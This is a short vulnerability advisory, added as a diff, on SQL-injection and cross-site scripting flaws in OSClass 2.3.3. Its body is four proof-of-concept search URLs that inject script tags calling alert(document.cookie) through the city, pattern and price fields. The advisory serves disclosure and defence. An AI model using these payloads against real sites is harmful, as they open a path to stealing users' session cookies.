@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/51662/info
+ 
+OSClass is prone to SQL-injection and cross-site scripting vulnerabilities.
+ 
+Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+ 
+OSClass 2.3.3 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/index.php?page=search&sCity=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/scrip t%3E
+
+http://www.example.com/index.php?page=search&sPattern=%3C/title%3E%3Cscript%3Ealert%28document.cookie%29; %3C/script%3E
+
+http://www.example.com/index.php?page=search&sPriceMax=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/s cript%3E
+
+http://www.example.com/index.php?page=search&sPriceMin=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/s cript%3E 
